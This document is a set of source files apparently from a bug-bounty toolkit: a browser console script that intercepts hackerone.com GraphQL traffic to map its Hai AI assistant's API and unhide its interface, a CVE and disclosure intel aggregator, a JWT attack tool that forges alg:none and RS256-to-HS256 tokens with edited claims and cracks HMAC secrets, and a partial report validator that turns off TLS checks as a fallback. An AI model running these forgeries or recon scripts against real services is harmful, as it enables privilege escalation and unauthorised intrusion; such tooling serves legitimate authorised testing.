// HAI BROWSER RECON — Paste in DevTools Console on hackerone.com
// ============================================================
// This script intercepts Hai's GraphQL requests to map its API surface.
// Usage: Open any report page → DevTools → Console → Paste this

(function() {
  console.log('[HAI RECON] Starting intercept...');

  // Store captured requests
  window.__hai_recon = {
    requests: [],
    mutations: new Set(),
    queries: new Set(),
    endpoints: new Set(),
  };

  // Intercept fetch
  const originalFetch = window.fetch;
  window.fetch = async function(...args) {
    const [url, options] = args;
    const urlStr = typeof url === 'string' ? url : url?.url || '';

    // Capture GraphQL requests
    if (urlStr.includes('graphql') || urlStr.includes('hai') || urlStr.includes('llm') || urlStr.includes('copilot')) {
      let body = null;
      try {
        if (options?.body) {
          body = JSON.parse(options.body);
        }
      } catch(e) {}

      const entry = {
        url: urlStr,
        method: options?.method || 'GET',
        body: body,
        timestamp: new Date().toISOString(),
        operationName: body?.operationName || 'unknown',
      };

      window.__hai_recon.requests.push(entry);

      if (body?.operationName) {
        if (body.query?.includes('mutation')) {
          window.__hai_recon.mutations.add(body.operationName);
        } else {
          window.__hai_recon.queries.add(body.operationName);
        }
      }

      window.__hai_recon.endpoints.add(urlStr);

      console.log(`[HAI RECON] ${entry.method} ${entry.operationName}`, body?.variables || '');
    }

    const response = await originalFetch.apply(this, args);

    // Clone and log response for GraphQL/Hai calls
    if (urlStr.includes('graphql') || urlStr.includes('hai')) {
      const clone = response.clone();
      clone.json().then(data => {
        const lastReq = window.__hai_recon.requests[window.__hai_recon.requests.length - 1];
        if (lastReq) {
          lastReq.response = data;
          // Check for errors (potential auth issues = IDOR opportunity)
          if (data?.errors) {
            console.warn(`[HAI RECON] ERROR in ${lastReq.operationName}:`, data.errors);
          }
        }
      }).catch(() => {});
    }

    return response;
  };

  // Intercept XMLHttpRequest too
  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function(method, url) {
    this.__hai_url = url;
    this.__hai_method = method;
    return origOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function(body) {
    if (this.__hai_url && (this.__hai_url.includes('hai') || this.__hai_url.includes('graphql') || this.__hai_url.includes('llm'))) {
      console.log(`[HAI RECON] XHR ${this.__hai_method} ${this.__hai_url}`);
      window.__hai_recon.endpoints.add(this.__hai_url);
    }
    return origSend.apply(this, arguments);
  };

  // Helper: dump all captured data
  window.haiDump = function() {
    console.log('\n========== HAI RECON DUMP ==========');
    console.log('Mutations found:', [...window.__hai_recon.mutations]);
    console.log('Queries found:', [...window.__hai_recon.queries]);
    console.log('Endpoints:', [...window.__hai_recon.endpoints]);
    console.log('Total requests:', window.__hai_recon.requests.length);
    console.log('Full data:', JSON.stringify(window.__hai_recon, null, 2));
    console.log('====================================\n');

    // Copy to clipboard
    const dump = {
      mutations: [...window.__hai_recon.mutations],
      queries: [...window.__hai_recon.queries],
      endpoints: [...window.__hai_recon.endpoints],
      requests: window.__hai_recon.requests,
    };

    try {
      navigator.clipboard.writeText(JSON.stringify(dump, null, 2));
      console.log('[HAI RECON] Data copied to clipboard!');
    } catch(e) {
      console.log('[HAI RECON] Could not copy to clipboard. Use: copy(JSON.stringify(window.__hai_recon, null, 2))');
    }

    return dump;
  };

  // Helper: search JS bundles for Hai-related code
  window.haiSearchBundles = async function() {
    console.log('[HAI RECON] Searching JS bundles for Hai operations...');
    const scripts = document.querySelectorAll('script[src]');
    const keywords = ['LlmConversation', 'HaiChat', 'Copilot', 'DestroyLlm', 'CreateLlm', 'hai_', 'copilot_', 'llm_message', 'llm_conversation'];

    for (const script of scripts) {
      try {
        const resp = await fetch(script.src);
        const text = await resp.text();

        for (const kw of keywords) {
          if (text.includes(kw)) {
            // Find context around keyword
            const idx = text.indexOf(kw);
            const context = text.substring(Math.max(0, idx - 100), idx + 200);
            console.log(`[HAI RECON] Found "${kw}" in ${script.src.split('/').pop()}:`);
            console.log(`  ...${context}...`);
          }
        }
      } catch(e) {
        // CORS blocked, skip
      }
    }
  };

  // Helper: reveal hidden Hai UI elements
  window.haiRevealUI = function() {
    let revealed = 0;
    document.querySelectorAll('[class*="hidden"], [class*="invisible"], [style*="display: none"], [style*="visibility: hidden"]').forEach(el => {
      const text = el.textContent?.toLowerCase() || '';
      const cls = el.className?.toLowerCase() || '';
      if (text.includes('hai') || text.includes('copilot') || text.includes('llm') || text.includes('ai') ||
          cls.includes('hai') || cls.includes('copilot') || cls.includes('llm')) {
        el.style.display = 'block';
        el.style.visibility = 'visible';
        el.classList.remove('hidden', 'invisible');
        revealed++;
        console.log(`[HAI RECON] Revealed element:`, el);
      }
    });
    console.log(`[HAI RECON] Revealed ${revealed} hidden Hai elements`);
  };

  console.log('[HAI RECON] Intercept active. Commands:');
  console.log('  haiDump()          - Export all captured requests');
  console.log('  haiSearchBundles() - Search JS bundles for Hai code');
  console.log('  haiRevealUI()      - Reveal hidden Hai UI elements');
  console.log('  Now interact with Hai, then run haiDump()');
})();

#!/usr/bin/env python3
"""
intel_engine.py — On-demand intelligence fetch for a target.

Wraps learn.py data sources + HackerOne MCP + hunt memory context.
Called by /intel command. Outputs prioritized intel with memory context.

Usage:
    python3 intel_engine.py --target target.com --tech "nextjs,graphql"
    python3 intel_engine.py --target target.com --tech "nextjs" --program target-program
    python3 intel_engine.py --target target.com --tech "nextjs" --memory-dir ~/.claude/projects/proj/hunt-memory
"""

import argparse
import json
import os
import sys
from datetime import datetime, timezone

# Import learn.py functions (same repo)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)
_REPO = os.path.dirname(BASE_DIR)
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)
from tools.banner import print_banner  # noqa: E402

from learn import fetch_github_advisories, fetch_nvd_cves, severity_order

# Try importing HackerOne MCP server
try:
    sys.path.insert(0, os.path.join(BASE_DIR, "..", "mcp", "hackerone-mcp"))
    from server import search_disclosed_reports, get_program_stats, HackerOneAPIError
    H1_MCP_AVAILABLE = True
except ImportError:
    H1_MCP_AVAILABLE = False

# ─── Color codes ─────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"


def load_memory_context(memory_dir: str, target: str) -> dict:
    """Load hunt memory context for a target.

    Returns:
        Dict with tested_endpoints, findings, tech_stack, last_hunted, patterns.
    """
    context = {
        "tested_endpoints": [],
        "findings": [],
        "tech_stack": [],
        "last_hunted": None,
        "hunt_sessions": 0,
        "patterns": [],
        "tested_cves": [],
    }

    if not memory_dir or not os.path.isdir(memory_dir):
        return context

    # Load target profile
    targets_dir = os.path.join(memory_dir, "targets")
    if os.path.isdir(targets_dir):
        # Normalize target name to filename
        target_file = target.replace(".", "-").replace("/", "-") + ".json"
        target_path = os.path.join(targets_dir, target_file)
        if os.path.isfile(target_path):
            try:
                with open(target_path) as f:
                    profile = json.load(f)
                context["tested_endpoints"] = profile.get("tested_endpoints", [])
                context["findings"] = profile.get("findings", [])
                context["tech_stack"] = profile.get("tech_stack", [])
                context["last_hunted"] = profile.get("last_hunted")
                context["hunt_sessions"] = profile.get("hunt_sessions", 0)
            except json.JSONDecodeError as e:
                print(
                    f"WARNING: corrupted target profile {target_path}: {e}",
                    file=sys.stderr,
                )
            except OSError as e:
                print(
                    f"WARNING: could not read target profile {target_path}: {e}",
                    file=sys.stderr,
                )

    # Load journal entries for this target to find tested CVEs
    journal_path = os.path.join(memory_dir, "journal.jsonl")
    if os.path.isfile(journal_path):
        try:
            with open(journal_path) as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        entry = json.loads(line)
                        if entry.get("target") == target:
                            # Check if any tag looks like a CVE
                            for tag in entry.get("tags", []):
                                if tag.upper().startswith("CVE-"):
                                    context["tested_cves"].append(tag.upper())
                    except json.JSONDecodeError as e:
                        print(
                            f"WARNING: corrupted journal line in {journal_path}: {e}",
                            file=sys.stderr,
                        )
                        continue
        except OSError as e:
            print(
                f"WARNING: could not read journal {journal_path}: {e}",
                file=sys.stderr,
            )

    # Load patterns
    patterns_path = os.path.join(memory_dir, "patterns.jsonl")
    if os.path.isfile(patterns_path):
        try:
            with open(patterns_path) as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        pattern = json.loads(line)
                        context["patterns"].append(pattern)
                    except json.JSONDecodeError as e:
                        print(
                            f"WARNING: corrupted patterns line in {patterns_path}: {e}",
                            file=sys.stderr,
                        )
                        continue
        except OSError as e:
            print(
                f"WARNING: could not read patterns {patterns_path}: {e}",
                file=sys.stderr,
            )

    return context


def fetch_all_intel(techs: list[str], target: str, program: str = "") -> list[dict]:
    """Fetch intel from all sources."""
    all_results = []

    for tech in techs:
        print(f"  {CYAN}[{tech}]{RESET} GitHub Advisory DB...")
        all_results.extend(fetch_github_advisories(tech))

        print(f"  {CYAN}[{tech}]{RESET} NVD CVE API...")
        all_results.extend(fetch_nvd_cves(tech))

    # HackerOne via MCP server (preferred) or learn.py fallback
    if H1_MCP_AVAILABLE:
        print(f"  {CYAN}[H1 MCP]{RESET} Searching disclosed reports...")
        try:
            if program:
                reports = search_disclosed_reports(program=program, limit=15)
            else:
                for tech in techs[:3]:
                    reports = search_disclosed_reports(keyword=tech, limit=5)
                    for r in reports:
                        all_results.append({
                            "id": r.get("url", ""),
                            "source": "HackerOne",
                            "tech": tech,
                            "severity": r.get("severity", "UNKNOWN"),
                            "summary": r.get("title", ""),
                            "published": r.get("disclosed_at", ""),
                            "program": r.get("program", ""),
                        })
            if program:
                for r in reports:
                    all_results.append({
                        "id": r.get("url", ""),
                        "source": f"HackerOne/{program}",
                        "tech": "program",
                        "severity": r.get("severity", "UNKNOWN"),
                        "summary": r.get("title", ""),
                        "published": r.get("disclosed_at", ""),
                        "program": r.get("program", ""),
                    })
        except HackerOneAPIError as e:
            print(f"  {YELLOW}HackerOne MCP error: {e}{RESET}")
    else:
        print(f"  {DIM}[H1 MCP not available — using learn.py fallback]{RESET}")
        from learn import fetch_hackerone_hacktivity, TECH_H1_KEYWORDS
        for tech in techs:
            keywords = TECH_H1_KEYWORDS.get(tech.lower(), [tech])
            for kw in keywords[:2]:
                print(f"  {CYAN}[{tech}]{RESET} HackerOne Hacktivity '{kw}'...")
                h1_results = fetch_hackerone_hacktivity(kw, limit=5)
                all_results.extend(h1_results)

    # Program stats if available
    if program and H1_MCP_AVAILABLE:
        print(f"  {CYAN}[H1 MCP]{RESET} Program stats for {program}...")
        try:
            stats = get_program_stats(program)
            if "error" not in stats:
                all_results.append({
                    "id": f"program:{program}",
                    "source": "HackerOne/stats",
                    "tech": "program",
                    "severity": "INFO",
                    "summary": (
                        f"{stats.get('name', program)}: "
                        f"{'bounty' if stats.get('offers_bounties') else 'no bounty'}, "
                        f"{stats.get('resolved_reports', '?')} resolved, "
                        f"avg {stats.get('avg_days_to_first_response', '?')}d response"
                    ),
                    "published": stats.get("launched_at", ""),
                    "stats": stats,
                })
        except HackerOneAPIError as e:
            print(f"  {YELLOW}Stats error: {e}{RESET}")

    return all_results


def prioritize_intel(results: list[dict], memory: dict) -> dict:
    """Prioritize intel against memory context.

    Returns:
        Dict with categorized alerts: critical, high, info, memory_context.
    """
    tested_endpoints = set(memory.get("tested_endpoints", []))
    tested_cves = set(memory.get("tested_cves", []))

    critical = []
    high = []
    info = []

    for r in results:
        sev = r.get("severity", "UNKNOWN").upper()
        cve_id = r.get("id", "")

        # Check if this CVE was already tested
        already_tested = cve_id.upper() in tested_cves if cve_id.startswith("CVE") else False

        entry = {
            **r,
            "already_tested": already_tested,
        }

        if already_tested:
            entry["note"] = "Already tested in a previous hunt session."
            info.append(entry)
        elif sev in ("CRITICAL",):
            entry["note"] = "Untested critical vulnerability. Hunt candidate."
            critical.append(entry)
        elif sev in ("HIGH",):
            entry["note"] = "Untested high-severity finding. Priority target."
            high.append(entry)
        else:
            info.append(entry)

    # Sort each category by severity
    critical.sort(key=lambda x: severity_order(x.get("severity", "UNKNOWN")))
    high.sort(key=lambda x: severity_order(x.get("severity", "UNKNOWN")))

    memory_context = {}
    if memory.get("last_hunted"):
        memory_context["last_hunted"] = memory["last_hunted"]
    if memory.get("tech_stack"):
        memory_context["tech_stack"] = memory["tech_stack"]
    if memory.get("hunt_sessions"):
        memory_context["hunt_sessions"] = memory["hunt_sessions"]
    memory_context["tested_endpoints_count"] = len(tested_endpoints)
    memory_context["tested_cves_count"] = len(tested_cves)

    # Find matching patterns from other targets
    matching_patterns = []
    target_tech = set(t.lower() for t in memory.get("tech_stack", []))
    for pattern in memory.get("patterns", []):
        pattern_tech = set(t.lower() for t in pattern.get("tech_stack", []))
        if target_tech & pattern_tech:
            matching_patterns.append({
                "target": pattern.get("target", ""),
                "technique": pattern.get("technique", ""),
                "vuln_class": pattern.get("vuln_class", ""),
                "payout": pattern.get("payout", 0),
            })
    if matching_patterns:
        memory_context["matching_patterns"] = matching_patterns

    return {
        "critical": critical,
        "high": high,
        "info": info,
        "memory_context": memory_context,
        "total": len(results),
    }


def format_output(target: str, intel: dict) -> str:
    """Format intel output for terminal display."""
    lines = [
        f"",
        f"{BOLD}INTEL: {target}{RESET}",
        f"{'═' * 50}",
        f"",
    ]

    if intel["critical"]:
        lines.append(f"{BOLD}ALERTS:{RESET}")
        for item in intel["critical"]:
            lines.append(f"  {RED}[CRITICAL]{RESET} {item.get('id', '')} — {item.get('summary', '')}")
            if item.get("note"):
                lines.append(f"    → {item['note']}")
        lines.append("")

    if intel["high"]:
        if not intel["critical"]:
            lines.append(f"{BOLD}ALERTS:{RESET}")
        for item in intel["high"]:
            lines.append(f"  {YELLOW}[HIGH]{RESET} {item.get('id', '')} — {item.get('summary', '')}")
            if item.get("note"):
                lines.append(f"    → {item['note']}")
        lines.append("")

    if intel["info"]:
        info_count = len(intel["info"])
        tested = sum(1 for i in intel["info"] if i.get("already_tested"))
        lines.append(f"  {GREEN}[INFO]{RESET} {info_count} additional findings ({tested} already tested)")
        lines.append("")

    # Memory context
    mc = intel.get("memory_context", {})
    if mc:
        lines.append(f"{BOLD}MEMORY CONTEXT:{RESET}")
        if mc.get("last_hunted"):
            lines.append(f"  Last hunted: {mc['last_hunted']}")
        if mc.get("hunt_sessions"):
            lines.append(f"  Hunt sessions: {mc['hunt_sessions']}")
        if mc.get("tech_stack"):
            lines.append(f"  Tech stack: {', '.join(mc['tech_stack'])}")
        lines.append(f"  Tested endpoints: {mc.get('tested_endpoints_count', 0)}")
        lines.append(f"  Tested CVEs: {mc.get('tested_cves_count', 0)}")

        if mc.get("matching_patterns"):
            lines.append(f"  {CYAN}Cross-target patterns:{RESET}")
            for p in mc["matching_patterns"][:3]:
                payout = f" (${p['payout']})" if p.get("payout") else ""
                lines.append(f"    • {p['target']}: {p['technique']} [{p['vuln_class']}]{payout}")

    lines.append("")
    lines.append(f"{DIM}Total: {intel['total']} findings from GitHub Advisory, NVD, HackerOne{RESET}")
    lines.append("")

    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(description="On-demand intel for a target")
    parser.add_argument("--target", required=True, help="Target domain")
    parser.add_argument("--tech", default="", help="Comma-separated tech stack")
    parser.add_argument("--program", default="", help="HackerOne program handle")
    parser.add_argument("--memory-dir", default="", help="Path to hunt-memory directory")
    parser.add_argument("--json", action="store_true", help="Output as JSON instead of formatted text")
    args = parser.parse_args()

    techs = [t.strip() for t in args.tech.split(",") if t.strip()] if args.tech else []

    if not techs:
        print(f"{YELLOW}No tech stack specified. Use --tech to specify technologies.{RESET}")
        print(f"Example: python3 intel_engine.py --target {args.target} --tech nextjs,graphql")
        sys.exit(1)

    # Load memory context
    memory = load_memory_context(args.memory_dir, args.target)

    # If memory has tech stack, merge with CLI args
    if memory.get("tech_stack"):
        for t in memory["tech_stack"]:
            if t.lower() not in [x.lower() for x in techs]:
                techs.append(t)

    if not args.json:
        print_banner(
            "Intel Engine · CVE + Disclosure Recon",
            target=args.target,
            steps=[
                ("Tech CVEs",   "GitHub Advisory · NVD lookup per stack"),
                ("Disclosures", "HackerOne Hacktivity + Bugcrowd"),
                ("Memory",      "merge prior findings for similar targets"),
                ("Prioritize",  "rank intel by impact vs. observed patterns"),
            ],
        )
        print(f"Tech: {CYAN}{', '.join(techs)}{RESET}")
        if args.program:
            print(f"Program: {CYAN}{args.program}{RESET}")
        print()

    # Fetch all intel
    results = fetch_all_intel(techs, args.target, args.program)

    # Prioritize against memory
    intel = prioritize_intel(results, memory)

    if args.json:
        print(json.dumps(intel, indent=2))
    else:
        print(format_output(args.target, intel))


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
"""
JWT attack toolkit — offline forging + analysis.

Implements the three highest-paid JWT bugs from the auth skill:
  1. alg:none      — strip the signature, set alg to none/None/NONE/nOnE.
                     Works when the verifier honors `alg` from the (attacker-
                     controlled) header.
  2. RS256 -> HS256 algorithm confusion — re-sign the token with HS256 using
                     the server's *public* key as the HMAC secret. Works when
                     the verifier calls a generic verify(token, key) that picks
                     the algorithm from the header.
  3. Weak HMAC secret crack — brute-force the HS256 secret against a wordlist.

Plus a static `analyze()`: decodes claims, flags missing exp, alg=none,
sensitive claims (role/admin/is_admin), and short-secret risk.

All forging/cracking is pure stdlib (no `cryptography` dep) and unit-tested.

Usage:
  tools/jwt_scanner.py <token> --analyze
  tools/jwt_scanner.py <token> --alg-none
  tools/jwt_scanner.py <token> --confuse --public-key pub.pem
  tools/jwt_scanner.py <token> --crack --wordlist secrets.txt
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
from dataclasses import dataclass
from pathlib import Path


def b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode(token: str) -> tuple[dict, dict, str]:
    """Return (header, payload, signature_b64). Raises ValueError on malformed."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("not a 3-part JWT")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def _encode_segment(obj: dict) -> str:
    return b64url_encode(json.dumps(obj, separators=(",", ":")).encode())


def forge_alg_none(token: str) -> list[str]:
    """Produce alg:none forgeries with the original claims and an empty sig."""
    header, payload, _ = decode(token)
    out = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = dict(header)
        h["alg"] = alg
        out.append(f"{_encode_segment(h)}.{_encode_segment(payload)}.")
    return out


def forge_hs256_with_key(token: str, key: bytes, set_claims: dict | None = None) -> str:
    """Re-sign as HS256 using `key` as the HMAC secret (alg-confusion attack)."""
    header, payload, _ = decode(token)
    header = dict(header)
    header["alg"] = "HS256"
    if set_claims:
        payload = {**payload, **set_claims}
    signing_input = f"{_encode_segment(header)}.{_encode_segment(payload)}"
    sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{b64url_encode(sig)}"


def confuse_rs256_to_hs256(token: str, public_key_pem: bytes, set_claims: dict | None = None) -> str:
    """RS256->HS256: use the raw public-key PEM bytes as the HMAC secret."""
    return forge_hs256_with_key(token, public_key_pem, set_claims)


def _hs256_valid(token: str, secret: bytes) -> bool:
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected = hmac.new(secret, signing_input, hashlib.sha256).digest()
    try:
        return hmac.compare_digest(expected, b64url_decode(parts[2]))
    except Exception:
        return False


def crack_secret(token: str, wordlist: list[str]) -> str | None:
    """Brute the HS256 secret against a wordlist. Returns the secret or None."""
    header, _, _ = decode(token)
    if str(header.get("alg", "")).upper() != "HS256":
        return None
    for w in wordlist:
        if _hs256_valid(token, w.encode()):
            return w
    return None


@dataclass
class JwtIssue:
    severity: str
    title: str
    detail: str


def analyze(token: str) -> list[JwtIssue]:
    """Static analysis of a JWT's header + claims."""
    issues: list[JwtIssue] = []
    header, payload, sig = decode(token)
    alg = str(header.get("alg", "")).lower()

    if alg in ("none", ""):
        issues.append(JwtIssue("CRITICAL", "alg=none accepted by issuer",
                               "Signature not required — forge any claims."))
    if alg.startswith("hs"):
        issues.append(JwtIssue("INFO", f"symmetric alg ({header.get('alg')})",
                               "Try secret-crack and (if server also accepts RS) alg confusion."))
    if "exp" not in payload:
        issues.append(JwtIssue("MEDIUM", "no `exp` claim",
                               "Token never expires — stolen token is permanently valid."))
    if not sig:
        issues.append(JwtIssue("HIGH", "empty signature segment",
                               "Token is unsigned as transmitted."))
    for claim in ("role", "is_admin", "isAdmin", "admin", "scope", "permissions", "user_id", "uid"):
        if claim in payload:
            issues.append(JwtIssue("INFO", f"trust-bearing claim `{claim}={payload[claim]}`",
                                   "If you can forge the token, escalate by editing this claim."))
    if "kid" in header:
        issues.append(JwtIssue("INFO", f"`kid` header present ({header['kid']})",
                               "Probe kid for path traversal / SQLi / command injection."))
    return issues


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="JWT attack toolkit (offline)")
    ap.add_argument("token")
    ap.add_argument("--analyze", action="store_true")
    ap.add_argument("--alg-none", action="store_true")
    ap.add_argument("--confuse", action="store_true", help="RS256->HS256 confusion")
    ap.add_argument("--public-key", help="PEM file for --confuse (HMAC secret)")
    ap.add_argument("--crack", action="store_true")
    ap.add_argument("--wordlist", help="wordlist for --crack")
    ap.add_argument("--set", action="append", default=[],
                    help="claim override key=value (repeatable; for forgeries)")
    args = ap.parse_args(argv)

    set_claims: dict = {}
    for kv in args.set:
        if "=" in kv:
            k, v = kv.split("=", 1)
            set_claims[k] = v

    did = False
    if args.analyze:
        did = True
        for i in analyze(args.token):
            print(f"[{i.severity}] {i.title} — {i.detail}")
    if args.alg_none:
        did = True
        print("# alg:none forgeries")
        for t in forge_alg_none(args.token):
            print(t)
    if args.confuse:
        did = True
        if not args.public_key:
            ap.error("--confuse requires --public-key <pem>")
        pem = Path(args.public_key).read_bytes()
        print("# RS256->HS256 confusion (public key as HMAC secret)")
        print(confuse_rs256_to_hs256(args.token, pem, set_claims or None))
    if args.crack:
        did = True
        if not args.wordlist:
            ap.error("--crack requires --wordlist <file>")
        words = [w.strip() for w in Path(args.wordlist).read_text().splitlines() if w.strip()]
        secret = crack_secret(args.token, words)
        print(f"[FOUND] HS256 secret = {secret!r}" if secret
              else "[miss] secret not in wordlist")
    if not did:
        # default: analyze
        for i in analyze(args.token):
            print(f"[{i.severity}] {i.title} — {i.detail}")
    return 0


if __name__ == "__main__":
    sys.exit(main())

#!/usr/bin/env python3
"""
validate.py — Interactive bug validation assistant.
Walks through the 4 validation gates, checks for duplicates, calculates CVSS,
and generates a skeleton HackerOne report.

Usage:
  python3 tools/validate.py
  python3 tools/validate.py --output findings/myreport.md
"""

import argparse
import json
import os
import ssl
import sys
import urllib.request
import urllib.error
from datetime import datetime

_REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)
from tools.banner import print_banner  # noqa: E402

# macOS: Python may not have system SSL certs. Use unverified context for API queries.
_SSL_CTX = ssl.create_default_context()
try:
    import certifi
    _SSL_CTX = ssl.create_default_context(cafile=certifi.where())
except ImportError:
    _SSL_CTX.check_hostname = False
    _SSL_CTX.verify_mode = ssl.CERT_NONE

# ─── Color codes ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

# ─── CVSS 4.0 scoring ─────────────────────────────────────────────────────────
# Implements the CVSS 4.0 macro-vector approach from FIRST.org.
# For authoritative scores verify at: https://www.first.org/cvss/calculator/4.0

def _eq1(av: str, pr: str, ui: str) -> int:
    """EQ1: Attack Vector / Privileges Required / User Interaction (0=highest severity)."""
    if av == "N" and (pr == "N" or ui == "N"):
        return 0
    if av == "N" or pr == "N" or ui == "N":
        return 1
    return 2

def _eq2(ac: str, at: str) -> int:
    """EQ2: Attack Complexity / Attack Requirements."""
    return 0 if (ac == "L" and at == "N") else 1

def _eq3(vc: str, vi: str, va: str) -> int:
    """EQ3: Vulnerable System CIA impact."""
    if vc == "H" and vi == "H":
        return 0
    if vc == "H" or vi == "H" or va == "H":
        return 1
    return 2

def _eq4(sc: str, si: str, sa: str) -> int:
    """EQ4: Subsequent System impact (Safety > High > Low/None)."""
    if si == "S" or sa == "S":
        return 0
    if sc == "H" or si == "H" or sa == "H":
        return 1
    return 2

# CVSS 4.0 base score lookup by macro vector (eq1, eq2, eq3, eq4).
# EQ5=0 (E=Active, default for base metrics).
# EQ6 is derived from EQ3 with default CR=IR=AR=High.
# Values approximate FIRST.org CVSS 4.0 specification.
# Verify exact scores at: https://www.first.org/cvss/calculator/4.0
#
# eq1: 0=Network+(no-auth or no-UI), 1=partial advantage, 2=local/physical/high-priv+UI
# eq2: 0=Low-complexity+no-prereqs, 1=otherwise
# eq3: 0=VC+VI both High, 1=partial High, 2=no High CIA on vulnerable system
# eq4: 0=Safety impact, 1=High subsequent-system impact, 2=no subsequent impact
_CVSS40_TABLE: dict[tuple[int, int, int, int], float] = {
    # eq1=0 (widest attack reach: network + no-auth OR no-UI)
    (0, 0, 0, 0): 10.0, (0, 0, 0, 1): 10.0, (0, 0, 0, 2): 9.3,
    (0, 0, 1, 0): 9.5,  (0, 0, 1, 1): 9.1,  (0, 0, 1, 2): 7.1,
    (0, 0, 2, 0): 7.9,  (0, 0, 2, 1): 6.9,  (0, 0, 2, 2): 4.8,
    (0, 1, 0, 0): 9.5,  (0, 1, 0, 1): 9.1,  (0, 1, 0, 2): 8.0,
    (0, 1, 1, 0): 8.9,  (0, 1, 1, 1): 8.5,  (0, 1, 1, 2): 6.5,
    (0, 1, 2, 0): 7.0,  (0, 1, 2, 1): 5.5,  (0, 1, 2, 2): 4.0,
    # eq1=1 (some network/auth/UI advantage)
    (1, 0, 0, 0): 9.3,  (1, 0, 0, 1): 9.0,  (1, 0, 0, 2): 7.8,
    (1, 0, 1, 0): 8.8,  (1, 0, 1, 1): 8.5,  (1, 0, 1, 2): 6.5,
    (1, 0, 2, 0): 7.0,  (1, 0, 2, 1): 6.0,  (1, 0, 2, 2): 4.5,
    (1, 1, 0, 0): 9.0,  (1, 1, 0, 1): 8.5,  (1, 1, 0, 2): 7.5,
    (1, 1, 1, 0): 8.5,  (1, 1, 1, 1): 7.5,  (1, 1, 1, 2): 5.9,
    (1, 1, 2, 0): 6.0,  (1, 1, 2, 1): 5.5,  (1, 1, 2, 2): 3.5,
    # eq1=2 (local/physical or high-privileges + active UI required)
    (2, 0, 0, 0): 9.0,  (2, 0, 0, 1): 8.5,  (2, 0, 0, 2): 7.5,
    (2, 0, 1, 0): 8.0,  (2, 0, 1, 1): 7.5,  (2, 0, 1, 2): 6.5,
    (2, 0, 2, 0): 6.0,  (2, 0, 2, 1): 5.5,  (2, 0, 2, 2): 4.0,
    (2, 1, 0, 0): 8.5,  (2, 1, 0, 1): 8.0,  (2, 1, 0, 2): 7.0,
    (2, 1, 1, 0): 7.5,  (2, 1, 1, 1): 7.0,  (2, 1, 1, 2): 5.5,
    (2, 1, 2, 0): 5.5,  (2, 1, 2, 1): 5.0,  (2, 1, 2, 2): 3.5,
}


def calculate_cvss40(av, ac, at, pr, ui, vc, vi, va, sc, si, sa) -> tuple[float, str]:
    """Calculate CVSS 4.0 base score (approximate) and return (score, vector_string)."""
    e1 = _eq1(av, pr, ui)
    e2 = _eq2(ac, at)
    e3 = _eq3(vc, vi, va)
    e4 = _eq4(sc, si, sa)
    score = _CVSS40_TABLE.get((e1, e2, e3, e4), 5.0)
    vector = (
        f"CVSS:4.0/AV:{av}/AC:{ac}/AT:{at}/PR:{pr}/UI:{ui}"
        f"/VC:{vc}/VI:{vi}/VA:{va}/SC:{sc}/SI:{si}/SA:{sa}"
    )
    return score, vector


def severity_from_score(score: float) -> str:
    if score == 0.0:  return "NONE"
    if score < 4.0:   return "LOW"
    if score < 7.0:   return "MEDIUM"
    if score < 9.0:   return "HIGH"
    return "CRITICAL"


# ─── GraphQL string escaping ──────────────────────────────────────────────────

def _escape_graphql_string(s: str) -> str:
    """Escape a value for safe interpolation inside a GraphQL double-quoted string."""
    return (s
            .replace("\\", "\\\\")
            .replace('"', '\\"')
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t"))


# ─── HackerOne dup check ──────────────────────────────────────────────────────

def check_h1_dups(program_handle: str, vuln_keyword: str) -> list[dict]:
    """Search HackerOne for potential duplicates."""
    if not program_handle:
        return []

    query = {
        "query": f"""{{
          hacktivity_items(
            first: 10,
            order_by: {{ field: popular, direction: DESC }},
            where: {{
              team: {{ handle: {{ _eq: "{_escape_graphql_string(program_handle)}" }} }},
              report: {{ title: {{ _icontains: "{_escape_graphql_string(vuln_keyword)}" }} }}
            }}
          ) {{
            nodes {{
              ... on HacktivityDocument {{
                report {{
                  title
                  severity_rating
                  disclosed_at
                  url
                  state
                }}
              }}
            }}
          }}
        }}"""
    }
    try:
        req = urllib.request.Request(
            "https://hackerone.com/graphql",
            data=json.dumps(query).encode(),
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=10, context=_SSL_CTX) as resp:
            data = json.loads(resp.read().decode())
        nodes = (data.get("data") or {}).get("hacktivity_items", {}).get("nodes", [])
        results = []
        for node in nodes:
            r = node.get("report")
            if r:
                results.append(r)
        return results
    except Exception as exc:
        print(
            f"  {YELLOW}HackerOne duplicate check failed: {exc}{RESET}",
            file=sys.stderr,
        )
        return []


# ─── Interactive prompt helpers ───────────────────────────────────────────────

